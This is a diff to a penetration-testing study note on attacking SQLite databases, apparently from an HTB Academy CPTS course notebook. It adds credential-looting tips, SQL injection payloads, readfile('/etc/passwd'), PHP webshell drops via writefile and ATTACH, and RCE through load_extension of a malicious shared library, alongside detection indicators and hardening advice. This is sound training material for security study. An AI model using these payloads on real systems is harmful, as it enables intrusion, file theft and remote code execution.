@@ -69,6 +69,10 @@ SELECT name, sql FROM sqlite_master WHERE type='table';   -- schema (SQLite's in
 SELECT * FROM users;
 ```
 
+> [!tip] **Grab the sidecar files too, and recover deleted rows.** A live DB in WAL mode has `found.db-wal` and `found.db-shm` next to it holding **committed-but-not-yet-checkpointed** writes — copy all three or you miss recent data. Deleted rows often survive in freelist pages: `sqlite3 found.db .recover` reconstructs droppable/deleted content, and a raw `strings found.db` frequently coughs up deleted creds the tables no longer show.
+
+> [!warning] **"File is not a database" → likely SQLCipher.** Mobile/desktop apps (Signal, many password managers) store data in **SQLCipher** — whole-file AES encryption, so the `SQLite format 3` header is *absent* and `sqlite3` refuses to open it. It's not corrupt; you need the key, which is frequently hardcoded in the app binary, in a keystore/config, or derived from a device value. Open with `sqlcipher` + `PRAGMA key='...';` once you have it.
+
 ### SQL injection — the SQLite dialect
 
 Copied MySQL/MSSQL payloads break on SQLite in specific ways — this table is the difference:
@@ -88,7 +92,26 @@ Copied MySQL/MSSQL payloads break on SQLite in specific ways — this table is t
 ' UNION SELECT username, password, NULL FROM users-- -
 ```
 
-> [!note] **No file-read primitive, and `load_extension` is off by default.** Unlike MySQL (`LOAD_FILE`) or PostgreSQL (`pg_read_file`), SQLite has **no built-in arbitrary file read**, and `load_extension()` (→ RCE via a malicious `.so`) is **disabled in application drivers** unless explicitly enabled. So SQLite injection is mostly data-exfil plus the write path below — not the file-read/exec buffet the client-server engines hand you. Full dialect handling: [[Class notes/HTB Academy/CPTS v2 (claude)/SQL Injection|SQL Injection]].
+> [!note] **File read/write/RCE is *context-dependent*, not absent.** SQLite's **core** SQL has no file-read (unlike MySQL `LOAD_FILE` / PostgreSQL `pg_read_file`), so against a hardened **application driver** (PHP PDO, Python `sqlite3`) — where `load_extension()` is disabled and the `fileio` extension isn't loaded — injection is mostly data-exfil plus the `ATTACH` write path below. But that "no file read" line collapses the moment you're in a context that has the `fileio` extension or `load_extension` enabled (see next section). Full dialect handling: [[Class notes/HTB Academy/CPTS v2 (claude)/SQL Injection|SQL Injection]].
+
+### File read / write / RCE — `readfile` / `writefile` / `load_extension`
+
+The primitives most notes wrongly say SQLite "doesn't have." They live in the **`fileio` extension**, which is **compiled into the `sqlite3` CLI shell by default** — verified on 3.53.4 — and can be loaded by any app that enables it. `load_extension()` is likewise **enabled in the CLI** (disabled only in the C API / language-driver defaults).
+
+```sql
+-- Arbitrary file READ (fileio ext / CLI shell)
+SELECT readfile('/etc/passwd');
+
+-- Arbitrary file WRITE — one statement, no stacked-query requirement (unlike ATTACH)
+SELECT writefile('/var/www/html/sh.php', '<?php system($_GET[0]); ?>');
+
+-- RCE via a malicious shared library: writefile the .so, then load it.
+-- The .so's sqlite3_<name>_init entry point runs on load = code execution.
+SELECT writefile('/tmp/e.so', readfile('/tmp/local-evil.so'));
+SELECT load_extension('/tmp/e.so');
+```
+
+> [!tip] **When do you actually have these?** (1) Looting a found DB via the `sqlite3` CLI — you have all three, so a found DB on a writable host is a file-write/RCE pivot, not just a data dump. (2) An app that called `enable_load_extension(True)` or loaded `fileio` (rare but happens in data-processing apps). (3) **Not** in default PDO/python-driver injection — there, fall back to `ATTACH` below. Check with `SELECT readfile('/etc/hostname');` before relying on it.
 
 ### RCE — `ATTACH DATABASE` writes a webshell
 
@@ -113,6 +136,15 @@ INSERT INTO users (username, password, role) VALUES ('x', '<hash>', 'admin');
 
 ---
 
+## Detection & Artefacts
+
+- **The `ATTACH`/`writefile` webshell is a file with the `SQLite format 3` header (or a hybrid PHP+SQLite blob) in the web root** — grepping the docroot for the magic bytes finds dropped shells. `writefile()` output has no SQLite header, so a `.php` that is valid PHP but not valid SQLite is the tell.
+- **`readfile`/`writefile`/`load_extension` in query logs or app error logs** are abnormal for an app that only does CRUD — a strong IOC of injection abuse.
+- **A new `.so` in `/tmp` immediately followed by a `load_extension` call** is the RCE signature.
+- Defensively: serve `.db`/`.sqlite*` with a deny rule, keep DB files outside the web root, run the app driver with `load_extension` disabled (the default) and never load `fileio`, store secrets hashed.
+
+---
+
 ## Dangerous Settings
 
 | Setting | Risk |
@@ -121,6 +153,8 @@ INSERT INTO users (username, password, role) VALUES ('x', '<hash>', 'admin');
 | World-readable `.db` (`0644` in a shared dir) | Any local user reads every stored credential |
 | World-writable / app-writable `.db` | Auth bypass by editing rows; `ATTACH`-write RCE |
 | `load_extension()` enabled in the app | Injection → arbitrary `.so` load → RCE |
+| `fileio` extension loaded (or CLI context) | `readfile`/`writefile` → single-statement file read + write, no stacked queries needed |
+| WAL sidecars (`-wal`/`-shm`) left world-readable | Recent uncheckpointed writes + deleted rows exposed |
 | Secrets stored plaintext / weak hash | SQLite has no column encryption — the row *is* the plaintext to whoever reads the file |
 
 ---
@@ -136,12 +170,16 @@ INSERT INTO users (username, password, role) VALUES ('x', '<hash>', 'admin');
 | List tables (SQLi) | `SELECT name FROM sqlite_master WHERE type='table'` |
 | Detect back end via SQLi | `UNION SELECT sqlite_version()` |
 | Dump schema | `SELECT name, sql FROM sqlite_master` |
-| Injection → webshell | `ATTACH DATABASE '/var/www/html/sh.php' AS s; CREATE TABLE s.p(x); INSERT INTO s.p VALUES('<?php system($_GET[0]);?>')` |
+| Recover deleted rows | `sqlite3 found.db .recover` / `strings found.db` |
+| File read (fileio/CLI) | `SELECT readfile('/etc/passwd')` |
+| File write (fileio/CLI) | `SELECT writefile('/var/www/html/sh.php','<?php system($_GET[0]);?>')` |
+| RCE via extension | `SELECT load_extension('/tmp/e.so')` |
+| Injection → webshell (driver) | `ATTACH DATABASE '/var/www/html/sh.php' AS s; CREATE TABLE s.p(x); INSERT INTO s.p VALUES('<?php system($_GET[0]);?>')` |
 
 > [!note] **See also** — [[Exploits/find_sqlite|find_sqlite.sh]] (custom tool: locate every SQLite DB on a foothold by magic bytes, incl. unnamed ones), [[Tools/Database/sqlite3|sqlite3]].
 
 ---
 
 *Created: 2026-08-20*
-*Updated: 2026-08-25*
-*Model: claude-opus-5*
+*Updated: 2026-09-22*
+*Model: claude-opus-4-8*
